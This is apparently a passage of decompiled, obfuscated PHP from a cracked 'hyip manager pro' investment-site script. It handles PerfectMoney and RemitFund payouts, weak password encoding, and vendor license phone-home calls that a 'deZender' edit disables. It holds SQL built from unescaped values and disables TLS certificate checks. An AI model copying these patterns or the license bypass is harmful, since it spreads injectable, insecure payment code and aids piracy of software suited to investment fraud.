    {
      $elnlcNiWo[$elnlcEuoJk['elnlcCegwQ']] = $elnlcEuoJk['elnlcVufnu'];
      $elnlcEEPim = false;
      if ($elnlcyTICm = stristr ($elnlcgbgtz, '<errorresponse>') === false)
      {
        $elnlcEEPim = true;
      }
      else
      {
        $elnlcnhDv = strlen ($elnlcgbgtz) - strlen ($elnlcyTICm);
      }

      if ($elnlchSBEG = stristr ($elnlcgbgtz, '</errorresponse>') === false)
      {
        $elnlcEEPim = true;
      }
      else
      {
        $elnlcddwC = strlen ($elnlcgbgtz) - strlen ($elnlchSBEG);
      }

      while (!$elnlcEEPim)
      {
        $elnlclgqU = trim (substr ($elnlcgbgtz, $elnlcnhDv + 15, $elnlcddwC - 15));
        $elnlcHrvn = false;
        if ($elnlcdrEG = stristr ($elnlclgqU, '<error>') === false)
        {
          $elnlcHrvn = true;
        }
        else
        {
          $elnlcFwFPF = strlen ($elnlclgqU) - strlen ($elnlcdrEG);
        }

        if ($elnlcKSaC = stristr ($elnlclgqU, '</error>') === false)
        {
          $elnlcHrvn = true;
        }
        else
        {
          $elnlcgnqU = strlen ($elnlclgqU) - strlen ($elnlcKSaC);
        }

        while (!$elnlcHrvn)
        {
          $elnlclgVF = trim (substr ($elnlclgqU, $elnlcFwFPF + 7, $elnlcgnqU - 7));
          $elnlclgqU = trim (substr ($elnlclgqU, $elnlcgnqU + 8));
          $elnlcNiWo[$elnlcEuoJk['elnlczwcF']] = elnlcutfb ($elnlclgVF, 'text');
          $elnlcNiWo[$elnlcEuoJk['elnlcnQeB']] = elnlcutfb ($elnlclgVF, 'additional');
          if ($elnlcdrEG = stristr ($elnlclgqU, '<error>') === false)
          {
            $elnlcHrvn = true;
          }
          else
          {
            $elnlcFwFPF = strlen ($elnlclgqU) - strlen ($elnlcdrEG);
          }

          if ($elnlcKSaC = stristr ($elnlclgqU, '</error>') === false)
          {
            $elnlcHrvn = true;
            continue;
          }
          else
          {
            $elnlcgnqU = strlen ($elnlclgqU) - strlen ($elnlcKSaC);
            continue;
          }
        }

        $elnlcgbgtz = trim (substr ($elnlcgbgtz, $elnlcddwC + 16));
        if ($elnlcyTICm = stristr ($elnlcgbgtz, '<errorresponse>') === false)
        {
          $elnlcEEPim = true;
        }
        else
        {
          $elnlcnhDv = strlen ($elnlcgbgtz) - strlen ($elnlcyTICm);
        }

        if ($elnlchSBEG = stristr ($elnlcgbgtz, '</errorresponse>') === false)
        {
          $elnlcEEPim = true;
          continue;
        }
        else
        {
          $elnlcddwC = strlen ($elnlcgbgtz) - strlen ($elnlchSBEG);
          continue;
        }
      }
    }

    return $elnlcNiWo;
  }

  function elnlcgjjfa ($elnlcRDaq, $elnlcTegBJ)
  {
    global $elnlcEuoJk;
    $elnlcoInNj = strlen ($elnlcTegBJ) + 2;
    $elnlchkHAJ = strpos ($elnlcRDaq, '' . '<' . $elnlcTegBJ . ' ');
    $elnlcvxDs = strpos ($elnlcRDaq, '' . '<' . $elnlcTegBJ . '>');
    if ($elnlchkHAJ !== false)
    {
      $elnlcnhDv = $elnlchkHAJ;
    }

    if ($elnlcvxDs !== false)
    {
      $elnlcnhDv = $elnlcvxDs;
    }

    if ($elnlcnhDv === false)
    {
      return '';
    }

    if ($elnlcddwC = strpos ($elnlcRDaq, '' . '</' . $elnlcTegBJ . '>') === false)
    {
      return '';
    }

    $elnlcxDdc = strpos ($elnlcRDaq, '>', $elnlcnhDv);
    $elnlctlFRC = trim (substr ($elnlcRDaq, $elnlcxDdc + 1, $elnlcddwC - ($elnlcnhDv + $elnlcoInNj)));
    return $elnlctlFRC;
  }

  function elnlcsgyi ($elnlcwOTW)
  {
    global $elnlcEuoJk;
    $elnlcNiWo = array ();
    $elnlczaxd = elnlcgjjfa ($elnlcwOTW, 'Receipt');
    if ($elnlczaxd != '')
    {
      $elnlcNiWo[$elnlcEuoJk['elnlcCegwQ']] = $elnlcEuoJk['elnlcOBEJR'];
      $elnlcPgsH = $elnlczaxd;
      $elnlcNiWo[$elnlcEuoJk['elnlcGPoCs']] = elnlcgjjfa ($elnlcPgsH, 'ReceiptId');
      $elnlcNiWo[$elnlcEuoJk['elnlciheCL']] = elnlcgjjfa ($elnlcPgsH, 'Payer');
      $elnlcNiWo[$elnlcEuoJk['elnlcAMrP']] = elnlcgjjfa ($elnlcPgsH, 'Payee');
      $elnlcFMHFp = elnlcgjjfa ($elnlcPgsH, 'Equivalent');
      $elnlcNiWo[$elnlcEuoJk['elnlcMOxFJ']] = elnlcgjjfa ($elnlcFMHFp, 'Amount');
      $elnlcNiWo[$elnlcEuoJk['elnlcWkrr']] = elnlcgjjfa ($elnlcFMHFp, 'CurrencyId');
    }

    $elnlcgbgtz = elnlcgjjfa ($elnlcwOTW, 'ErrorResponse');
    if ($elnlcgbgtz != '')
    {
      $elnlcNiWo[$elnlcEuoJk['elnlcCegwQ']] = $elnlcEuoJk['elnlcVufnu'];
      $elnlclgVF = $elnlcgbgtz;
      $elnlcNiWo[$elnlcEuoJk['elnlczwcF']] = elnlcgjjfa ($elnlclgVF, 'Text');
      $elnlcNiWo[$elnlcEuoJk['elnlcnQeB']] = elnlcgjjfa ($elnlclgVF, 'Additional');
    }

    return $elnlcNiWo;
  }

  function elnlclcgq ($elnlcwOTW)
  {
    global $elnlcEuoJk;
    $elnlcNiWo = array ();
    $elnlczaxd = elnlcgjjfa ($elnlcwOTW, 'Receipt');
    if ($elnlczaxd != '')
    {
      $elnlcNiWo[$elnlcEuoJk['elnlcCegwQ']] = $elnlcEuoJk['elnlcOBEJR'];
      $elnlcPgsH = $elnlczaxd;
      $elnlcNiWo[$elnlcEuoJk['elnlcGPoCs']] = elnlcgjjfa ($elnlcPgsH, 'ReceiptId');
      $elnlcNiWo[$elnlcEuoJk['elnlciheCL']] = elnlcgjjfa ($elnlcPgsH, 'Payer');
      $elnlcNiWo[$elnlcEuoJk['elnlcAMrP']] = elnlcgjjfa ($elnlcPgsH, 'Payee');
      $elnlcNiWo[$elnlcEuoJk['elnlcMOxFJ']] = elnlcgjjfa ($elnlcPgsH, 'Amount');
      $elnlcNiWo[$elnlcEuoJk['elnlcWkrr']] = elnlcgjjfa ($elnlcPgsH, 'CurrencyId');
    }

    $elnlcgbgtz = elnlcgjjfa ($elnlcwOTW, 'Balance');
    if ($elnlcgbgtz != '')
    {
      $elnlcNiWo[$elnlcEuoJk['elnlcCegwQ']] = $elnlcEuoJk['elnlcOBEJR'];
      $elnlclgVF = $elnlcgbgtz;
      $elnlcNiWo[$elnlcEuoJk['elnlccJgEp']] = elnlcgjjfa ($elnlclgVF, 'Value');
    }

    $elnlcgbgtz = elnlcgjjfa ($elnlcwOTW, 'Error');
    if ($elnlcgbgtz != '')
    {
      $elnlcNiWo[$elnlcEuoJk['elnlcCegwQ']] = $elnlcEuoJk['elnlcVufnu'];
      $elnlclgVF = $elnlcgbgtz;
      $elnlcNiWo[$elnlcEuoJk['elnlczwcF']] = elnlcgjjfa ($elnlclgVF, 'Text');
      $elnlcNiWo[$elnlcEuoJk['elnlcnQeB']] = elnlcgjjfa ($elnlclgVF, 'Description');
    }

    return $elnlcNiWo;
  }

  function elnlcvkdd ($elnlcwOTW)
  {
    global $elnlcEuoJk;
    $elnlcNiWo = array ();
    $elnlczaxd = elnlcgjjfa ($elnlcwOTW, 'Status');
    if (elnlcgjjfa ($elnlczaxd, 'Code') == $elnlcEuoJk['elnlcWuAFh'])
    {
      $elnlcNiWo[$elnlcEuoJk['elnlcCegwQ']] = $elnlcEuoJk['elnlcOBEJR'];
    }
    else
    {
      $elnlcNiWo[$elnlcEuoJk['elnlcCegwQ']] = $elnlcEuoJk['elnlcVufnu'];
      $elnlcNiWo[$elnlcEuoJk['elnlczwcF']] = elnlcgjjfa ($elnlcwOTW, 'Message');
    }

    $elnlcmdNOg = elnlcgjjfa ($elnlcwOTW, 'Balance');
    if ($elnlcmdNOg != '')
    {
      $elnlcNiWo[$elnlcEuoJk['elnlccJgEp']] = $elnlcmdNOg;
    }

    $elnlczaxd = elnlcgjjfa ($elnlcwOTW, 'Transfer');
    if ($elnlczaxd != '')
    {
      $elnlcNiWo[$elnlcEuoJk['elnlciheCL']] = elnlcgjjfa ($elnlczaxd, 'Payer');
      $elnlcNiWo[$elnlcEuoJk['elnlcAMrP']] = elnlcgjjfa ($elnlczaxd, 'Payee');
      $elnlcNiWo[$elnlcEuoJk['elnlcMOxFJ']] = elnlcgjjfa ($elnlczaxd, 'Amount');
      $elnlcNiWo[$elnlcEuoJk['elnlcEOWon']] = elnlcgjjfa ($elnlczaxd, 'Memo');
      $elnlcNiWo[$elnlcEuoJk['elnlcGPoCs']] = elnlcgjjfa ($elnlczaxd, 'Batch');
      $elnlcNiWo[$elnlcEuoJk['elnlczwcF']] = elnlcgjjfa ($elnlczaxd, 'Message');
    }

    return $elnlcNiWo;
  }

  function elnlconwt ($elnlcOhRB, $elnlcdPCw, $elnlcDslPO, $elnlcCQAl, $elnlcgPrNl)
  {
    global $elnlcEuoJk;
    global $elnlcJutIa;
    if ($elnlcJutIa[$elnlcEuoJk['elnlcNUQQL']] == $elnlcEuoJk['elnlcMdla'])
    {
    }

    if ($elnlcJutIa[$elnlcEuoJk['elnlcctILW']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcDslPO == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to PerfectMoney account 0.\'';
      mysql_query ($q);
      return array (0, 'Invalid PerfectMoney account', '');
    }

    list ($elnlckNTHO, $elnlcnzOA) = elnlcgushn ($elnlcDslPO, 18);
    if ($elnlckNTHO == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcnzOA . '\'';
      mysql_query ($q);
      return array (0, $elnlcnzOA);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlcOhRB == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'perfectmoney_password\'';
        $elnlcbaLW = mysql_query ($q);
        while ($elnlcTnMjL = mysql_fetch_array ($elnlcbaLW))
        {
          $elnlczOBI = elnlcefsf ($elnlcTnMjL[$elnlcEuoJk['elnlcBVfc']], $elnlcEuoJk['elnlcdmCFO']);
        }
      }
      else
      {
        list ($elnlczOBI, $elnlcMwBdk) = preg_split ('/\\|/', $elnlcOhRB);
        $elnlcJutIa[$elnlcEuoJk['elnlcwHGzB']] = $elnlcMwBdk;
      }

      $elnlcJkNgH = curl_init ();
      $elnlcCQAl = rawurlencode ($elnlcCQAl);
      curl_setopt ($elnlcJkNgH, CURLOPT_URL, 'https://www.perfectmoney.com/acct/confirm.asp');
      curl_setopt ($elnlcJkNgH, CURLOPT_POST, 1);
      curl_setopt ($elnlcJkNgH, CURLOPT_POSTFIELDS, 'AccountID=' . rawurlencode ($elnlcJutIa[$elnlcEuoJk['elnlcGQPwC']]) . '&PassPhrase=' . rawurlencode ($elnlczOBI) . '&Payer_Account=' . rawurlencode ($elnlcJutIa[$elnlcEuoJk['elnlcwHGzB']]) . '&Payee_Account=' . rawurlencode ($elnlcDslPO) . '&Amount=' . rawurlencode ($elnlcdPCw) . ('' . '&Memo=' . $elnlcCQAl));
      curl_setopt ($elnlcJkNgH, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcJkNgH, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($elnlcJkNgH);
      curl_close ($elnlcJkNgH);
      $elnlcUfak = array ();
      if (preg_match ('/<input name=\'PAYMENT_BATCH_NUM\' type=\'hidden\' value=\'(\\d+)\'>/ims', $a, $elnlcUfak))
      {
        return array (1, '', $elnlcUfak[1]);
      }
      else
      {
        if (preg_match ('/<input name=\'ERROR\' type=\'hidden\' value=\\\'(.*?)\\\'>/ims', $a, $elnlcUfak))
        {
          $elnlcWsag = preg_replace ('/&lt;/i', '<', $elnlcUfak[1]);
          $elnlcWsag = preg_replace ('/&gt;/i', '>', $elnlcWsag);
          $e = elnlcmzdkr ('' . $elnlcgPrNl . ' ' . $elnlcWsag);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $elnlcgPrNl . ('' . ' ' . $elnlcWsag), '');
        }
        else
        {
          $e = elnlcmzdkr ('' . $elnlcgPrNl . ' Unknown error');
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $elnlcgPrNl . ' Unknown error', '');
        }
      }
    }
    else
    {
      $e = elnlcmzdkr ('' . $elnlcgPrNl . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcgPrNl . ' Curl functions are not available');
    }

  }

  function elnlceqycy ($elnlcOhRB, $elnlcdPCw, $elnlcDslPO, $elnlcCQAl, $elnlcgPrNl)
  {
    global $elnlcEuoJk;
    global $elnlcJutIa;
    if ($elnlcJutIa[$elnlcEuoJk['elnlcNUQQL']] == $elnlcEuoJk['elnlcMdla'])
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcJutIa[$elnlcEuoJk['elnlcctILW']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcDslPO == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to empty RemitFund account.\'';
      mysql_query ($q);
      return array (0, 'Invalid RemintFund account', '');
    }

    list ($elnlckNTHO, $elnlcnzOA) = elnlcgushn ($elnlcDslPO, 25);
    if ($elnlckNTHO == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcnzOA . '\'';
      mysql_query ($q);
      return array (0, $elnlcnzOA);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlcOhRB == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'remitfund_password\'';
        $elnlcbaLW = mysql_query ($q);
        while ($elnlcTnMjL = mysql_fetch_array ($elnlcbaLW))
        {
          $elnlcpirRs = elnlcefsf ($elnlcTnMjL[$elnlcEuoJk['elnlcBVfc']], $elnlcEuoJk['elnlcdmCFO']);
        }

        $elnlcMWtai = $elnlcJutIa[$elnlcEuoJk['elnlcrBFLn']];
      }
      else
      {
        list ($elnlcpirRs, $elnlcMWtai) = preg_split ('/\\|/', $elnlcOhRB);
      }

      $elnlcJkNgH = curl_init ();
      $elnlcOHCQ = strtoupper (md5 ('' . $elnlcMWtai . 'transferUSD' . $elnlcJutIa[$elnlcEuoJk['elnlccHJtH']] . $elnlcDslPO . $elnlcdPCw . strtoupper (md5 ($elnlcpirRs))));
      $elnlcRDaq = '<TransferRequest>
  <Auth>
    <ApiName>' . htmlspecialchars ($elnlcMWtai) . ('' . '</ApiName>
    <Token>' . $elnlcOHCQ . '</Token>
  </Auth>
  <Transfer>
    <TransferId></TransferId>
    <TransferType>transfer</TransferType>
    <Payer>') . htmlentities ($elnlcJutIa[$elnlcEuoJk['elnlccHJtH']], ENT_NOQUOTES) . '</Payer>
    <Payee>' . htmlentities ($elnlcDslPO, ENT_NOQUOTES) . '</Payee>
    <CurrencyId>USD</CurrencyId>
    <Amount>' . htmlentities ($elnlcdPCw, ENT_NOQUOTES) . '</Amount>
    <Memo>' . htmlentities ($elnlcCQAl, ENT_NOQUOTES) . '</Memo>
  </Transfer>
</TransferRequest>';
      $elnlcJkNgH = curl_init ();
      curl_setopt ($elnlcJkNgH, CURLOPT_URL, 'https://www.remitfund.com/xml/api.php?req=' . urlencode ($elnlcRDaq));
      curl_setopt ($elnlcJkNgH, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcJkNgH, CURLOPT_RETURNTRANSFER, 1);
      $elnlcBkmp = array ('User-Agent: Mozilla/5.0');
      curl_setopt ($elnlcJkNgH, CURLOPT_HTTPHEADER, $elnlcBkmp);
      $a = curl_exec ($elnlcJkNgH);
      curl_close ($elnlcJkNgH);
      $elnlcNiWo = elnlcpjlrm ($a);
      if ($elnlcNiWo[$elnlcEuoJk['elnlcCegwQ']] == $elnlcEuoJk['elnlcffPD'])
      {
        return array (1, '', $elnlcNiWo[$elnlcEuoJk['elnlcGPoCs']]);
      }
      else
      {
        if ($elnlcNiWo[$elnlcEuoJk['elnlcCegwQ']] == $elnlcEuoJk['elnlcgCmxF'])
        {
          $e = elnlcmzdkr ('' . $elnlcgPrNl . ' ' . $elnlcNiWo[$elnlcEuoJk['elnlczwcF']]);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
        else
        {
          $e = elnlcmzdkr ('' . $elnlcgPrNl . ' Parse error: ' . $a);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
      }
    }
    else
    {
      $e = elnlcmzdkr ('' . $elnlcgPrNl . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcgPrNl . ' Curl functions are not available');
    }

  }

  function elnlcpjlrm ($elnlcwOTW)
  {
    global $elnlcEuoJk;
    $elnlcNiWo = array ();
    $elnlczaxd = elnlcgjjfa ($elnlcwOTW, 'Response');
    if ($elnlczaxd != '')
    {
      $elnlcPgsH = $elnlczaxd;
      $elnlcNiWo[$elnlcEuoJk['elnlcUPGAL']] = elnlcgjjfa ($elnlcPgsH, 'Code');
      $elnlcNiWo[$elnlcEuoJk['elnlczwcF']] = elnlcgjjfa ($elnlcPgsH, 'Message');
      $elnlcNiWo[$elnlcEuoJk['elnlcCegwQ']] = ($elnlcNiWo[$elnlcEuoJk['elnlcUPGAL']] == 0 ? 'ok' : 'error');
      $elnlcNiWo[$elnlcEuoJk['elnlcGPoCs']] = elnlcgjjfa ($elnlcPgsH, 'TransferId');
      $elnlcNiWo[$elnlcEuoJk['elnlciheCL']] = elnlcgjjfa ($elnlcPgsH, 'Payer');
      $elnlcNiWo[$elnlcEuoJk['elnlcAMrP']] = elnlcgjjfa ($elnlcPgsH, 'Payee');
      $elnlcNiWo[$elnlcEuoJk['elnlcMOxFJ']] = elnlcgjjfa ($elnlcPgsH, 'Amount');
      $elnlcNiWo[$elnlcEuoJk['elnlcWkrr']] = elnlcgjjfa ($elnlcPgsH, 'Currency');
    }

    return $elnlcNiWo;
  }

  function elnlceiclm ($elnlctQvS, $a)
  {
    global $elnlcEuoJk;
    global $elnlcJutIa;
    if ($a != 'hyip manager pro 2005 jul 27')
    {
      return elnlcswdj ($elnlctQvS);
    }

    $elnlcmlwJr = base64_encode ($elnlctQvS);
    $a = preg_split ('//', $elnlcmlwJr);
    $b = preg_split ('//', md5 ($elnlctQvS) . base64_encode ($elnlctQvS));
    $elnlcmlwJr = '';
    for ($i = $elnlcEuoJk['elnlcTMAG']; $i < sizeof ($a); ++$i)
    {
      if (strlen ($a[$i]) == 0)
      {
        continue;
      }

      $elnlcmlwJr = $elnlcmlwJr . $a[$i] . $b[$i];
    }

    $elnlcmlwJr = str_replace ('=', '!!!^', $elnlcmlwJr);
    return elnlcseks ($elnlcmlwJr, $elnlcJutIa[$elnlcEuoJk['elnlcstTp']], $elnlcEuoJk['elnlcdmCFO']);
  }

  function elnlcefsf ($elnlctQvS, $a)
  {
    global $elnlcEuoJk;
    global $elnlcJutIa;
    if ($a != 'hyip manager pro 2005 jul 27')
    {
      return elnlcswdj ($elnlctQvS);
    }

    $elnlctQvS = str_replace ('!!!^', '=', elnlctuin ($elnlctQvS, $elnlcJutIa[$elnlcEuoJk['elnlcstTp']], 'hyip manager pro 2005 jul 27'));
    $a = preg_split ('//', $elnlctQvS);
    $elnlctQvS = '';
    for ($i = $elnlcEuoJk['elnlcTMAG']; $i < sizeof ($a); $i += 2)
    {
      $elnlctQvS .= $a[$i - 1];
    }

    $elnlcmlwJr = base64_decode ($elnlctQvS);
    return $elnlcmlwJr;
  }

  function elnlcswdj ($elnlctQvS)
  {
    global $elnlcEuoJk;
    $elnlcmlwJr = base64_encode ($elnlctQvS);
    $a = preg_split ('//', $elnlcmlwJr);
    $b = preg_split ('//', md5 ($elnlctQvS) . base64_encode ($elnlctQvS));
    $elnlcmlwJr = '';
    for ($i = $elnlcEuoJk['elnlcTMAG']; $i < sizeof ($a); ++$i)
    {
      $elnlcmlwJr = $elnlcmlwJr . $a[$i] . $b[$i];
    }

    $elnlcmlwJr = str_replace ('=', '!!!^', $elnlcmlwJr);
    return $elnlcmlwJr;
  }

  function elnlcoslc ($elnlctQvS)
  {
    global $elnlcEuoJk;
    $elnlctQvS = str_replace ('!!!^', '=', $elnlctQvS);
    $a = preg_split ('//', $elnlctQvS);
    $elnlctQvS = '';
    for ($i = $elnlcEuoJk['elnlcTMAG']; $i < sizeof ($a); $i += 2)
    {
      $elnlctQvS .= $a[$i - 1];
    }

    $elnlcmlwJr = base64_decode ($elnlctQvS);
    return $elnlcmlwJr;
  }

  function elnlcdwgz ()
  {
    global $elnlcEuoJk;
    global $elnlcVFudq;
    global $elnlcJutIa;
return;	// Added by deZender, 2010.01.30
    $elnlcBJqDH = ($elnlcJutIa[$elnlcEuoJk['elnlcSmBN']] == 1 ? '64.27.18.142' : $elnlcEuoJk['elnlcRtgL']);
    $elnlcsftU = @fopen ($elnlcEuoJk['elnlcGCKC'] . $elnlcBJqDH . '/check.cgi?domain=' . $elnlcVFudq[$elnlcEuoJk['elnlcqPkWP']] . '&license=' . $elnlcJutIa[$elnlcEuoJk['elnlcBVhT']] . '&zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz', 'r');
    if ($elnlcsftU)
    {
      fclose ($elnlcsftU);
    }

  }

  function elnlcyrbm ()
  {
    global $elnlcEuoJk;
    global $elnlcVFudq;
    global $elnlcJutIa;
return;	// Added by deZender, 2010.01.30
    $l = '';
    if (function_exists ('curl_init'))
    {
      $i = $elnlcEuoJk['elnlcTMAG'];
      while ($i < 2)
      {
        $elnlcJkNgH = curl_init ();
        if ($i == 1)
        {
          $elnlcBJqDH = '64.27.18.142';
        }
        else
        {
          $elnlcBJqDH = 'www.dnsargentina.com.ar';
        }

        $elnlcbUlyH = 'http://' . $elnlcBJqDH . '/check.cgi?install=1&script=3&domain=' . $elnlcVFudq[$elnlcEuoJk['elnlcqPkWP']] . '&license=' . $elnlcJutIa[$elnlcEuoJk['elnlcBVhT']] . '&cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc';
        curl_setopt ($elnlcJkNgH, CURLOPT_URL, $elnlcbUlyH);
        curl_setopt ($elnlcJkNgH, CURLOPT_RETURNTRANSFER, 1);
        $l = curl_exec ($elnlcJkNgH);
        curl_close ($elnlcJkNgH);
        if ($l != '')
        {
          $i = $elnlcEuoJk['elnlcGmHP'];
        }

        ++$i;
      }
    }

    if ($l == '')
    {
      $elnlcsftU = @fopen ($elnlcEuoJk['elnlcdxfPy'] . $elnlcVFudq[$elnlcEuoJk['elnlcqPkWP']] . '&license=' . $elnlcJutIa[$elnlcEuoJk['elnlcBVhT']] . '&cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc', 'r');
      if ($elnlcsftU)
      {
        $l = fread ($elnlcsftU, 200000);
        fclose ($elnlcsftU);
      }
    }

    return $l;
  }

  function elnlcxiztu ()
  {
    global $elnlcEuoJk;
  }

  function elnlcbtet ($elnlczrvd)
  {
    global $elnlcEuoJk;
    global $elnlcVFudq;
    global $elnlcJutIa;
return;	// Added by deZender, 2010.01.30
    $elnlcQISwH = base64_encode ($elnlczrvd);
    $elnlcJkNgH = curl_init ();
    $elnlcCQAl = rawurlencode ($elnlcCQAl);
    if ($elnlcJutIa[$elnlcEuoJk['elnlcSmBN']] == 1)
    {
      $elnlcBJqDH = '64.27.18.142';
    }
    else
    {
      if ($elnlcJutIa[$elnlcEuoJk['elnlcSmBN']] == 2)
      {
        $elnlcBJqDH = 'www.goldcodersmail.com';
      }
      else
      {
        $elnlcBJqDH = 'www.dnsargentina.com.ar';
      }
    }

    curl_setopt ($elnlcJkNgH, CURLOPT_URL, 'http://' . $elnlcBJqDH . $elnlcEuoJk['elnlcBtPWv']);
    curl_setopt ($elnlcJkNgH, CURLOPT_POST, 1);
    curl_setopt ($elnlcJkNgH, CURLOPT_POSTFIELDS, '' . 'in=' . $elnlcQISwH . '&domain=' . $elnlcVFudq[$elnlcEuoJk['elnlcqPkWP']] . '&s=p&license=' . $elnlcJutIa[$elnlcEuoJk['elnlcBVhT']]);
    curl_setopt ($elnlcJkNgH, CURLOPT_RETURNTRANSFER, 1);
    $l = curl_exec ($elnlcJkNgH);
    curl_close ($elnlcJkNgH);
    return chop ($l);
  }

  function elnlcjpjqj ($elnlczrvd, $elnlcfUjz = 0)
  {
    global $elnlcEuoJk;
    global $elnlcVFudq;
    global $elnlcJutIa;
return;	// Added by deZender, 2010.01.30
    if ($elnlcfUjz == 1)
    {
      $elnlcQISwH = substr (trim ($elnlczrvd), 0, 32);
    }
    else
    {
      $elnlcQISwH = base64_encode (serialize ($elnlczrvd));
    }

    $elnlcJkNgH = curl_init ();
    $elnlcCQAl = rawurlencode ($elnlcCQAl);
    if ($elnlcJutIa[$elnlcEuoJk['elnlcSmBN']] == 1)
    {
      $elnlcBJqDH = '64.27.18.142';
    }
    else
    {
      if ($elnlcJutIa[$elnlcEuoJk['elnlcSmBN']] == 2)
      {
        $elnlcBJqDH = 'www.goldcodersmail.com';
      }
      else
      {
        $elnlcBJqDH = 'www.dnsargentina.com.ar';
      }
    }

    curl_setopt ($elnlcJkNgH, CURLOPT_URL, 'http://' . $elnlcBJqDH . $elnlcEuoJk['elnlctGHCB']);
    curl_setopt ($elnlcJkNgH, CURLOPT_POST, 1);
    curl_setopt ($elnlcJkNgH, CURLOPT_POSTFIELDS, '' . 'in=' . $elnlcQISwH . '&mode=' . $elnlcfUjz . '&domain=' . $elnlcVFudq[$elnlcEuoJk['elnlcqPkWP']] . '&s=p&license=' . $elnlcJutIa[$elnlcEuoJk['elnlcBVhT']]);
    curl_setopt ($elnlcJkNgH, CURLOPT_RETURNTRANSFER, 1);
    $l = curl_exec ($elnlcJkNgH);
    curl_close ($elnlcJkNgH);
    if ($elnlcfUjz == 1)
    {
      $elnlcNiWo = array ();
      if ($l != 'nill')
      {
        $elnlcNiWo = unserialize (base64_decode (chop ($l)));
        if (!is_array ($elnlcNiWo))
        {
          $elnlcNiWo = array ();
        }
      }

      return $elnlcNiWo;
    }
    else
    {
      return chop ($l);
    }

  }

  function elnlcgjtfr ($elnlcFivhz, $elnlcxQWbE, $elnlcEUus, $elnlcfqOum)
  {
    global $elnlcEuoJk;
    global $elnlcJutIa;
    $q = '' . 'select * from hm2_emails where id = \'' . $elnlcFivhz . '\'';
    $elnlcbaLW = mysql_query ($q);
    $elnlcTnMjL = mysql_fetch_array ($elnlcbaLW);
    if (!$elnlcTnMjL)
    {
      return null;
    }

    if (!$elnlcTnMjL[$elnlcEuoJk['elnlcCegwQ']])
    {
      return null;
    }

    $elnlcjiWD = $elnlcTnMjL[$elnlcEuoJk['elnlczwcF']];
    $elnlcKUbe = $elnlcTnMjL[$elnlcEuoJk['elnlcQysk']];
    $elnlccGEM = $elnlcTnMjL[$elnlcEuoJk['elnlcjRJom']];
    foreach ($elnlcfqOum as $k => $v)
    {
      if (is_array ($v))
      {
        $v = $v[0];
      }

      $elnlcjiWD = preg_replace ('' . '/#' . $k . '#/', $v, $elnlcjiWD);
      $elnlccGEM = preg_replace ('' . '/#' . $k . '#/', $v, $elnlccGEM);
      if ($elnlcTnMjL[$elnlcEuoJk['elnlckmao']])
      {
        $elnlcKUbe = preg_replace ('' . '/#' . $k . '#/', $v, $elnlcKUbe);
        continue;
      }
    }

    $elnlcjiWD = preg_replace ('/#site_name#/', $elnlcJutIa[$elnlcEuoJk['elnlcNUQQL']], $elnlcjiWD);
    if ($elnlcTnMjL[$elnlcEuoJk['elnlckmao']])
    {
      $elnlcKUbe = preg_replace ('/#site_name#/', $elnlcJutIa[$elnlcEuoJk['elnlcNUQQL']], $elnlcKUbe);
    }

    $elnlccGEM = preg_replace ('/#site_name#/', $elnlcJutIa[$elnlcEuoJk['elnlcNUQQL']], $elnlccGEM);
    $elnlcjiWD = preg_replace ('/#site_url#/', $elnlcJutIa[$elnlcEuoJk['elnlcnnTqn']], $elnlcjiWD);
    if ($elnlcTnMjL[$elnlcEuoJk['elnlckmao']])
    {
      $elnlcKUbe = preg_replace ('/#site_url#/', $elnlcJutIa[$elnlcEuoJk['elnlcnnTqn']], $elnlcKUbe);
    }

    $elnlccGEM = preg_replace ('/#site_url#/', $elnlcJutIa[$elnlcEuoJk['elnlcnnTqn']], $elnlccGEM);
    if ($elnlcTnMjL[$elnlcEuoJk['elnlckmao']])
    {
      $elnlcrAid = elnlcwhkul (12);
      $elnlcjiWD = elnlcfwpri ($elnlcjiWD);
      $elnlcKUbe = elnlcokths ($elnlcKUbe);
      $elnlcFLunJ = '' . '--' . $elnlcrAid . '
Content-Type: text/plain;
Content-Transfer-Encoding: 8bit

' . $elnlcjiWD . '

